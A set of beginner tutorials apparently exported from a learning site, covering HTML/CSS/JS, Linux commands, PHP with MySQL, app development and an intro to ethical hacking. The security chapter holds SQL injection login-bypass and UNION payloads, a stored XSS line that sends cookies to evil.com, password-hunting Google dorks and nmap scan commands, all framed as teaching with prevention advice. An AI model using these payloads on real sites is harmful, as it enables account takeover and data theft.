title: Web Dev Basics
excerpt: Essential HTML/CSS/JS concepts with examples. Focus on responsive design and modern frameworks.

chapters.title: HTML Fundamentals
chapters.content:
HTML Fundamentals

HTML (HyperText Markup Language) is the skeleton of every web page. It uses elements and tags to define structure and meaning.

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title>My Page</title>
  </head>
  <body>
    <h1>Hello World</h1>
    <p>This is a paragraph.</p>
  </body>
</html>
Always include a DOCTYPE declaration and the lang attribute on the html tag for accessibility and SEO.

Semantic Elements

Semantic elements clearly describe their meaning to both the browser and the developer. Use them over generic div and span tags wherever possible.

  • <header> — top of page or section
  • <nav> — navigation links
  • <main> — primary content
  • <article> — self-contained piece of content
  • <section> — grouped related content
  • <footer> — bottom of page or section
  • <aside> — sidebar or tangential content
Semantic HTML improves accessibility, SEO, and code readability all at once.

chapters.title: CSS Styling & Layout
chapters.content:
CSS Styling & Layout

CSS controls how HTML elements look and how they're positioned on screen. The Box Model is the foundation of all layout work.

The Box Model

.element {
  margin: 20px;      /* outside space */
  border: 1px solid; /* boundary */
  padding: 16px;     /* inside space */
  width: 300px;      /* content width */
}

Flexbox

Flexbox is perfect for one-dimensional layouts — rows or columns.

.container {
  display: flex;
  justify-content: center;  /* horizontal */
  align-items: center;      /* vertical */
  gap: 16px;
  flex-wrap: wrap;
}

CSS Grid

Grid is ideal for two-dimensional layouts.

.grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 20px;
}

CSS Variables

:root {
  --primary: #c8141e;
  --bg: #080006;
  --text: #b8a8ad;
}

.btn {
  background: var(--primary);
  color: var(--text);
}
Use min(), clamp(), and max() CSS functions for fluid typography and spacing without relying solely on media queries.

chapters.title: JavaScript Essentials
chapters.content:
JavaScript Essentials

JavaScript makes pages interactive. It runs in the browser and can manipulate the DOM, handle events, fetch data, and much more.

Variables & Data Types

// Modern variable declarations
const name = 'Aayan';    // can't be reassigned
let count = 0;           // can be reassigned

// Types
const str = 'hello';     // string
const num = 42;          // number
const bool = true;       // boolean
const arr = [1, 2, 3];   // array
const obj = { a: 1 };    // object

DOM Manipulation

// Select element
const btn = document.querySelector('#myBtn');

// Add event listener
btn.addEventListener('click', () => {
  document.body.style.background = '#c8141e';
});

// Create & append elements
const p = document.createElement('p');
p.textContent = 'Hello!';
document.body.appendChild(p);

Fetch API

async function getData(url) {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    return data;
  } catch (err) {
    console.error('Fetch failed:', err);
  }
}
Master the fundamentals before jumping to frameworks. You'll understand React and Vue 10× better.

chapters.title: Responsive Design
chapters.content:
Responsive Design

Responsive design ensures your website looks great on every screen size — from mobile phones to 4K monitors.

Mobile First Approach

Always design for mobile first, then progressively enhance for larger screens.

/* Mobile first — base styles */
.card { padding: 16px; font-size: 0.9rem; }

/* Tablet */
@media (min-width: 768px) {
  .card { padding: 24px; font-size: 1rem; }
}

/* Desktop */
@media (min-width: 1200px) {
  .card { padding: 32px; font-size: 1.05rem; }
}

Fluid Typography with clamp()

h1 {
  font-size: clamp(2rem, 6vw, 5rem);
  /* min: 2rem | preferred: 6vw | max: 5rem */
}

.container {
  width: min(1200px, 92%);
  margin: 0 auto;
}

Viewport Units

UnitMeaningUse Case
vw1% of viewport widthFluid font sizes
vh1% of viewport heightFull-screen sections
svhSmall viewport heightMobile hero sections
dvhDynamic viewport heightMobile apps
Use svh or dvh instead of vh for mobile hero sections to account for browser chrome (address bar).

chapters.title: Frameworks Overview
chapters.content:
Modern Frameworks Overview

Once you have a solid grasp of HTML, CSS, and JavaScript, frameworks help you build larger, more complex applications with structure and efficiency.

FrameworkLanguageBest ForLearning Curve
ReactJSX / JSSPAs, large appsMedium
VueHTML + JSProgressive enhancementEasy
SvelteSvelteSmall, fast appsEasy
Next.jsJSX / TSSSR, full-stackMedium-Hard
AstroMultiContent-heavy sitesEasy

React Component Example

import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(c => c + 1)}>
        Increment
      </button>
    </div>
  );
}
Don't jump to a framework too early. Real understanding of vanilla JS makes you a far better framework developer.

title: Linux Commands Cheat Sheet
excerpt: Quick reference for terminal essentials, Git workflows, and server management.

chapters.title: File System Navigation
chapters.content:
File System Navigation

The Linux file system starts at the root /. Everything — files, devices, processes — is represented as a file in some directory.

pwd           # Print working directory
ls -la        # List all files (long format, hidden)
cd /path      # Change to absolute path
cd ..         # Go up one level
cd ~          # Go to home directory
cd -          # Go to previous directory
tree          # Show directory tree
find / -name "file.txt"   # Find by name
locate filename           # Fast find (uses index)

Key Directories

PathPurpose
/Root of the filesystem
/homeUser home directories
/etcConfiguration files
/var/logLog files
/usr/binUser executables
/tmpTemporary files (cleared on reboot)
/procVirtual filesystem (process info)
Tab completion is your best friend in the terminal. Never type full paths when Tab can do it for you.

chapters.title: File Operations
chapters.content:
File Operations

Mastering file operations is essential for working in Linux. These commands form the backbone of daily terminal use.

cp file.txt /dest/       # Copy file
cp -r dir/ /dest/        # Copy directory recursively
mv file.txt newname.txt  # Move / rename
rm file.txt              # Delete file
rm -rf directory/        # Force delete directory
mkdir -p path/to/dir     # Create nested directories
touch file.txt           # Create empty file
ln -s target link        # Create symbolic link

# Viewing files
cat file.txt             # Print full contents
less file.txt            # Scroll through (q to quit)
head -n 20 file.txt      # First 20 lines
tail -f logfile.log      # Follow live log output
wc -l file.txt           # Count lines
rm -rf is irreversible. There is no trash — files are gone forever. Always double-check your path before running it.

Text Processing

grep -r "pattern" .        # Search recursively
grep -i "pattern" file    # Case-insensitive search
awk '{print $1}' file     # Print first column
sed 's/old/new/g' file    # Find and replace
sort file.txt             # Sort lines
uniq file.txt             # Remove duplicates
cut -d',' -f1 file.csv   # Extract CSV column

chapters.title: Permissions & Users
chapters.content:
Permissions & Users

Linux is a multi-user system. Permissions control who can read, write, or execute each file.

Permission Format

# ls -la output format:
# drwxr-xr-x  owner  group  size  date  name
# │└┬┘└┬┘└┬┘
# │ │  │  └── others
# │ │  └───── group
# │ └──────── owner
# └────────── d=dir, -=file, l=symlink
NumberPermissionBinary
7rwx111
6rw-110
5r-x101
4r--100
0---000
chmod 755 script.sh      # rwxr-xr-x
chmod +x script.sh       # Add execute for all
chmod u+w file           # Add write for owner only
chown user:group file    # Change ownership
sudo chown -R www-data /var/www  # Recursive chown

# User management
whoami                   # Current user
id                       # User ID and groups
su - username            # Switch user
sudo command             # Run as root
passwd                   # Change password
useradd -m newuser       # Create user with home dir
usermod -aG sudo user    # Add user to sudo group

chapters.title: Process Management
chapters.content:
Process Management

Every running program is a process. Linux gives you fine-grained control over processes.

ps aux              # List all processes
top                 # Live process monitor
htop                # Better monitor (install first)
kill PID            # Send SIGTERM (graceful)
kill -9 PID         # Send SIGKILL (force)
pkill processname   # Kill by name
killall firefox     # Kill all instances

jobs                # List background jobs
bg %1               # Resume job in background
fg %1               # Bring to foreground
nohup cmd &         # Run immune to hangup
screen              # Terminal multiplexer
tmux                # Modern terminal multiplexer

systemd Services

systemctl status nginx        # Check service status
systemctl start nginx         # Start service
systemctl stop nginx          # Stop service
systemctl restart nginx       # Restart service
systemctl enable nginx        # Auto-start on boot
systemctl disable nginx       # Disable auto-start
journalctl -u nginx -f        # Follow service logs
journalctl -n 50              # Last 50 log lines
Use systemctl enable to make services survive reboots — especially important for web servers and databases.

chapters.title: Networking
chapters.content:
Networking

Linux has powerful networking tools built right into the command line.

ip addr             # Show IP addresses
ip route            # Show routing table
ping google.com     # Test connectivity
curl -I url         # Fetch HTTP headers only
curl -s url         # Silent download
wget url            # Download file
wget -r url         # Download recursively

ssh user@host           # Connect via SSH
ssh -p 2222 user@host   # Custom port
scp file user@host:/path  # Secure copy to remote
rsync -avz src/ user@host:/dest/  # Sync files

netstat -tulpn      # Open ports (old)
ss -tulpn           # Open ports (modern)
nmap target         # Scan ports
ufw status          # Firewall status
ufw allow 80/tcp    # Allow HTTP
ufw deny 23         # Deny Telnet

DNS & HTTP

dig google.com       # DNS lookup
nslookup domain      # Alternative DNS lookup
host domain          # Quick DNS
curl -v url          # Verbose HTTP request
curl -X POST -d '{"key":"val"}' url  # POST request

chapters.title: Git Essentials
chapters.content:
Git Essentials

Git is the industry-standard version control system. Master these commands and you'll be confident in any codebase.

git init                      # Init new repo
git clone url                 # Clone remote repo
git status                    # Check status
git add .                     # Stage all changes
git add file.txt              # Stage specific file
git commit -m "message"       # Commit staged changes
git push origin main          # Push to remote
git pull origin main          # Pull from remote

git branch                    # List branches
git branch feature-name       # Create branch
git checkout feature-name     # Switch branch
git checkout -b new-branch    # Create & switch
git merge branch-name         # Merge into current
git branch -d branch-name     # Delete branch

git log --oneline --graph     # Visual log
git diff                      # See unstaged changes
git diff --staged             # See staged changes
git stash                     # Stash changes
git stash pop                 # Apply stash
git reset --hard HEAD~1       # Undo last commit
git reset --hard permanently discards changes. Make sure you don't need those changes before running it.
Commit early, commit often. Small commits are easier to review, revert, and understand.

title: Cybersecurity Intro
excerpt: Beginner guide to ethical hacking, common vulnerabilities, and tools like Wireshark.

chapters.title: Foundations & CIA Triad
chapters.content:
Foundations & the CIA Triad

This material is for ethical learning only. Never attack systems without explicit written permission. Unauthorized access is illegal worldwide.

Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. The CIA Triad is the core model:

  • Confidentiality — Only authorized people can access data (encryption, access control)
  • Integrity — Data is accurate and hasn't been tampered with (hashing, checksums)
  • Availability — Systems and data are accessible when needed (uptime, backups, DDoS protection)

Common Attack Types

AttackDescriptionDefence
PhishingFake emails/sites to steal credentialsUser training, email filters
SQL InjectionInjecting SQL into input fieldsPrepared statements
XSSInjecting malicious JS into pagesOutput encoding, CSP
MITMIntercepting communicationsTLS/HTTPS, cert pinning
DDoSOverwhelming a server with requestsRate limiting, CDN
Brute ForceTrying all password combinationsAccount lockout, 2FA
Social EngineeringManipulating peopleSecurity awareness training

chapters.title: Ethical Hacking Phases
chapters.content:
Ethical Hacking Phases

Penetration testing follows a structured methodology. Understanding each phase helps both attackers and defenders.

  1. Reconnaissance — Gather information about the target without touching it
    • Passive: OSINT, Shodan, LinkedIn, WHOIS, Google dorks
    • Active: Ping sweeps, port scans (with permission)
  2. Scanning & Enumeration — Identify open ports, services, OS, vulnerabilities
  3. Gaining Access — Exploit identified vulnerabilities to get a foothold
  4. Maintaining Access — Simulate persistence (backdoors, rootkits)
  5. Covering Tracks — Understand how attackers hide evidence
  6. Reporting — Document all findings with severity ratings and recommendations

Google Dork Examples

site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
"password" filetype:txt site:example.com
Google dorking is passive reconnaissance — you're using public search results. However, accessing exposed content you're not authorized for may still be illegal.

OSINT Tools

  • Shodan — Search engine for internet-connected devices
  • theHarvester — Email, domain, IP harvesting
  • Maltego — Visual link analysis
  • Recon-ng — Web reconnaissance framework

chapters.title: Nmap & Scanning
chapters.content:
Nmap & Network Scanning

Nmap (Network Mapper) is the gold standard for network discovery and security auditing.

# Basic scans
nmap target.com             # Basic scan
nmap -sV target.com         # Detect service versions
nmap -sC target.com         # Run default scripts
nmap -O target.com          # OS detection
nmap -A target.com          # All of the above

# Port selection
nmap -p 80,443 target       # Specific ports
nmap -p 1-1000 target       # Port range
nmap -p- target             # All 65535 ports
nmap --top-ports 100 target # Top 100 common ports

# Scan types
nmap -sS target             # SYN stealth scan
nmap -sU target             # UDP scan
nmap -sn 192.168.1.0/24    # Ping sweep (host discovery)

# Output
nmap -oN output.txt target  # Normal output
nmap -oX output.xml target  # XML output
nmap -oA output target      # All formats

Common Open Ports

PortServiceRisk If Exposed
21FTPPlain text credentials
22SSHBrute force risk
23TelnetUnencrypted — never use
80HTTPWeb attacks
443HTTPSEncrypted web
3306MySQLShould never be public
3389RDPRansomware target

chapters.title: Wireshark Packet Analysis
chapters.content:
Wireshark Packet Analysis

Wireshark is a network protocol analyzer. It captures every packet flowing through your network interface and lets you inspect them in detail.

Key Display Filters

http                          # HTTP traffic only
https / tls                   # TLS/HTTPS traffic
tcp.port == 443               # Port 443
ip.addr == 192.168.1.1        # Traffic to/from IP
ip.src == 10.0.0.1            # Source IP filter
ip.dst == 10.0.0.2            # Destination IP filter
http.request.method == "GET"  # GET requests
http.request.method == "POST" # POST requests
dns                           # DNS queries
!(arp or dns or icmp)         # Filter out noise
tcp.flags.syn == 1            # SYN packets (connections)

What to Look For

  • Credentials in plain text — Look for POST requests to HTTP sites
  • DNS queries — Reveals what sites a device is visiting
  • ARP spoofing — Duplicate MAC addresses for same IP
  • Large data transfers — Potential data exfiltration
  • Unusual protocols — Unexpected traffic patterns

Follow TCP Stream

Right-click any packet → Follow → TCP Stream. This reconstructs the full conversation between two hosts — you can see HTTP requests and responses in plaintext.

Only capture traffic on networks you own or have explicit permission to analyze. Capturing others' traffic without consent is illegal.

chapters.title: SQL Injection & Web Vulns
chapters.content:
SQL Injection & Web Vulnerabilities

How SQL Injection Works

-- Normal login query
SELECT * FROM users 
WHERE username='admin' AND password='pass';

-- Attacker inputs: ' OR '1'='1' --
SELECT * FROM users 
WHERE username='' OR '1'='1' --' AND password='x';
-- '1'='1' is always true → login bypassed

-- Union-based SQLi (extract data)
' UNION SELECT username, password FROM users --

Prevention

// PHP - Prepared Statement (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);

// Python - Parameterized Query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

// Never do this:
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

Cross-Site Scripting (XSS)

// Stored XSS payload (stored in DB, runs for every visitor)
<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// Prevention: encode output
htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8')
// Set Content Security Policy header:
Content-Security-Policy: default-src 'self'
Use OWASP ZAP or Burp Suite (Community Edition) to test your own web apps for these vulnerabilities before attackers do.
The best time to find a vulnerability is before deployment. The worst time is after a breach.

title: PHP & MySQL Guide
excerpt: Backend development with PHP and MySQL — from basic syntax to database-driven apps.

chapters.title: PHP Basics
chapters.content:
PHP Basics

PHP is a server-side scripting language that runs on the web server. It's embedded in HTML and generates dynamic content before sending it to the browser.

<?php
// Variables (start with $)
$name = 'Aayan';
$age = 18;
$isStudent = true;

// Output
echo "Hello, $name!";
print_r($array);   // Debug arrays
var_dump($var);    // Debug with types

// String functions
strlen($str)       // Length
strtolower($str)   // Lowercase
trim($str)         // Remove whitespace
str_replace('a','b',$str) // Replace
explode(',', $str) // Split to array
implode(',', $arr) // Join array

// Array functions
count($arr)        // Length
array_push($arr, $val)    // Add to end
array_pop($arr)           // Remove from end
in_array($val, $arr)      // Check existence
array_map(fn, $arr)       // Transform all
array_filter($arr, fn)    // Filter
?>

Associative Arrays

<?php
$user = [
  'name' => 'Aayan',
  'role' => 'developer',
  'skills' => ['PHP', 'MySQL', 'Linux']
];

echo $user['name'];           // Aayan
echo $user['skills'][0];      // PHP

// Loop through
foreach ($user as $key => $value) {
  echo "$key: $value\n";
}
?>

chapters.title: MySQL Database Design
chapters.content:
MySQL Database Design

Good database design is the foundation of scalable applications. Plan your schema before writing a single line of PHP.

-- Create & select database
CREATE DATABASE karasudb CHARACTER SET utf8mb4;
USE karasudb;

-- Users table
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL UNIQUE,
  email VARCHAR(100) NOT NULL UNIQUE,
  password VARCHAR(255) NOT NULL,
  role ENUM('user','admin') DEFAULT 'user',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Posts table (with foreign key)
CREATE TABLE posts (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_id INT NOT NULL,
  title VARCHAR(200) NOT NULL,
  content TEXT,
  published BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Index for faster queries
CREATE INDEX idx_user_id ON posts(user_id);

CRUD Operations

-- INSERT
INSERT INTO users (username, email, password)
VALUES ('aayan', 'aayan@karasuberry.fun', 'hashed');

-- SELECT
SELECT * FROM users WHERE id = 1;
SELECT u.username, p.title FROM users u
JOIN posts p ON p.user_id = u.id
WHERE u.id = 1 ORDER BY p.created_at DESC LIMIT 10;

-- UPDATE
UPDATE users SET email='new@email.com' WHERE id=1;

-- DELETE
DELETE FROM posts WHERE id=5 AND user_id=1;

chapters.title: PHP + MySQL with PDO
chapters.content:
PHP + MySQL with PDO

PDO (PHP Data Objects) is the modern, secure way to connect PHP to MySQL. Always use prepared statements.

<?php
// db.php — reusable connection
function getDB() {
  static $pdo = null;
  if ($pdo === null) {
    $pdo = new PDO(
      'mysql:host=localhost;dbname=karasudb;charset=utf8mb4',
      'dbuser',
      'dbpassword',
      [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES => false
      ]
    );
  }
  return $pdo;
}

// Fetch single user
function getUserById($id) {
  $stmt = getDB()->prepare('SELECT * FROM users WHERE id = ?');
  $stmt->execute([$id]);
  return $stmt->fetch();
}

// Fetch multiple posts
function getPostsByUser($userId, $limit = 10) {
  $stmt = getDB()->prepare(
    'SELECT * FROM posts WHERE user_id = ? ORDER BY created_at DESC LIMIT ?'
  );
  $stmt->execute([$userId, $limit]);
  return $stmt->fetchAll();
}

// Insert and get new ID
function createPost($userId, $title, $content) {
  $db = getDB();
  $stmt = $db->prepare(
    'INSERT INTO posts (user_id, title, content) VALUES (?, ?, ?)'
  );
  $stmt->execute([$userId, $title, $content]);
  return $db->lastInsertId();
}
?>
Never concatenate user input directly into SQL strings. Always use prepared statements with placeholders (? or :name).

chapters.title: Authentication System
chapters.content:
Authentication System

Building secure user authentication is a critical skill. Here's a complete, secure login/register flow.

Registration

<?php
function register($username, $email, $password) {
  // Validate input
  if (strlen($password) < 8) {
    throw new Exception('Password too short');
  }
  
  // Hash password — NEVER store plain text
  $hashed = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
  
  try {
    $stmt = getDB()->prepare(
      'INSERT INTO users (username, email, password) VALUES (?, ?, ?)'
    );
    $stmt->execute([$username, $email, $hashed]);
    return getDB()->lastInsertId();
  } catch (PDOException $e) {
    if ($e->getCode() == 23000) { // Duplicate entry
      throw new Exception('Username or email already taken');
    }
    throw $e;
  }
}
?>

Login

<?php
function login($email, $password) {
  $stmt = getDB()->prepare('SELECT * FROM users WHERE email = ?');
  $stmt->execute([$email]);
  $user = $stmt->fetch();
  
  // password_verify prevents timing attacks
  if (!$user || !password_verify($password, $user['password'])) {
    throw new Exception('Invalid credentials');
  }
  
  // Start secure session
  session_start();
  session_regenerate_id(true); // Prevent session fixation
  $_SESSION['user_id'] = $user['id'];
  $_SESSION['username'] = $user['username'];
  $_SESSION['role'] = $user['role'];
  
  return $user;
}
?>

Auth Middleware

<?php
function requireLogin() {
  session_start();
  if (!isset($_SESSION['user_id'])) {
    header('Location: /login.php');
    exit;
  }
}

function requireAdmin() {
  requireLogin();
  if ($_SESSION['role'] !== 'admin') {
    http_response_code(403);
    die('Access denied');
  }
}

// Usage at top of protected pages:
requireLogin();
?>

title: App Development Intro
excerpt: Getting started with mobile and desktop application development concepts and tools.

chapters.title: App Types Overview
chapters.content:
App Types Overview

Before writing a single line of code, choose the right type of application for your use case. Each has trade-offs in performance, reach, and development speed.

TypeExamplesBuilt WithPros
Native MobileWhatsApp, InstagramSwift (iOS) / Kotlin (Android)Best performance & UX
Cross-Platform MobileDiscord, NotionReact Native, FlutterOne codebase, two platforms
DesktopVS Code, SlackElectron, TauriFull OS access
Progressive Web AppTwitter LiteHTML/CSS/JS + Service WorkerInstallable, no app store
CLI Toolgit, npmNode.js, Python, RustFast, scriptable

How to Choose

  • Need iOS and Android? → React Native or Flutter
  • Already know web tech? → PWA or Electron
  • Performance critical? → Native or Tauri (Rust)
  • Just need a utility? → CLI with Node.js or Python
The best stack is the one your team knows best. Exotic tech choices slow down shipping.

chapters.title: React Native
chapters.content:
React Native

React Native lets you build iOS and Android apps with JavaScript and React. Components map to native UI elements — not WebViews.

import React, { useState, useEffect } from 'react';
import {
  View, Text, TextInput, TouchableOpacity,
  FlatList, StyleSheet, ActivityIndicator
} from 'react-native';

export default function App() {
  const [data, setData] = useState([]);
  const [loading, setLoading] = useState(true);
  const [query, setQuery] = useState('');

  useEffect(() => {
    fetch('https://api.example.com/items')
      .then(r => r.json())
      .then(d => { setData(d); setLoading(false); });
  }, []);

  const filtered = data.filter(item =>
    item.name.toLowerCase().includes(query.toLowerCase())
  );

  if (loading) return <ActivityIndicator size="large" color="#c8141e" />;

  return (
    <View style={s.container}>
      <TextInput
        style={s.input}
        value={query}
        onChangeText={setQuery}
        placeholder="Search..."
      />
      <FlatList
        data={filtered}
        keyExtractor={item => String(item.id)}
        renderItem={({ item }) => (
          <Text style={s.item}>{item.name}</Text>
        )}
      />
    </View>
  );
}

const s = StyleSheet.create({
  container: { flex: 1, padding: 16, backgroundColor: '#080006' },
  input: { borderWidth: 1, borderColor: '#333', padding: 12, color: '#fff', borderRadius: 4, marginBottom: 16 },
  item: { color: '#b8a8ad', padding: 12, borderBottomWidth: 1, borderBottomColor: '#111' }
});
Use Expo for starting new React Native projects — it handles the build configuration and gives you a development server instantly.

chapters.title: Electron Desktop Apps
chapters.content:
Electron Desktop Apps

Electron bundles Chromium + Node.js so you can build desktop apps with web technologies. VS Code, Slack, Figma, and Discord are all built with it.

// main.js — main process
const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');

function createWindow() {
  const win = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true, // Security: enabled by default
      nodeIntegration: false  // Security: disabled by default
    }
  });
  win.loadFile('index.html');
}

app.whenReady().then(createWindow);
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

// IPC: receive message from renderer
ipcMain.handle('read-file', async (event, filePath) => {
  const fs = require('fs').promises;
  return await fs.readFile(filePath, 'utf8');
});
// preload.js — bridge between renderer and main
const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('api', {
  readFile: (path) => ipcRenderer.invoke('read-file', path)
});
Consider Tauri as a lighter Electron alternative. It uses a system WebView instead of bundling Chromium, resulting in apps 10-50× smaller.

chapters.title: PWA & Offline Apps
chapters.content:
Progressive Web Apps (PWA)

PWAs are websites with superpowers — installable on any device, work offline, receive push notifications, and load instantly from cache.

manifest.json

{
  "name": "KarasuBerry App",
  "short_name": "Karasu",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#080006",
  "theme_color": "#c8141e",
  "icons": [
    { "src": "icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "icon-512.png", "sizes": "512x512", "type": "image/png" }
  ]
}

Service Worker

// sw.js
const CACHE = 'v1';
const ASSETS = ['/', '/index.html', '/style.css', '/app.js'];

self.addEventListener('install', e => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
});

self.addEventListener('fetch', e => {
  e.respondWith(
    caches.match(e.request)
      .then(cached => cached || fetch(e.request))
  );
});
// Register service worker in your main JS
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW registered:', reg.scope))
    .catch(err => console.error('SW failed:', err));
}
PWAs are the most underrated app format. Zero install friction + cross-platform + no app store fees.
